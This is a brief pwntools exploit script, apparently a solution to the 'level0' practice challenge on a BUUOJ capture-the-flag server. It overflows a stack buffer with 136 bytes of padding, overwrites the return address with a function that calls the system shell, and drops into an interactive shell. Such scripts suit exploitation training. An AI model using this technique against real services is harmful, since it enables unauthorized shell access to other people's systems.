from pwn import *

io = remote("node3.buuoj.cn",27837)
#io = process('./level0')

callsystem_addr = 0x400596
rdi_addr = 0x400663
payload=cyclic(136)+p64(callsystem_addr)
io.sendline(payload)
io.interactive()


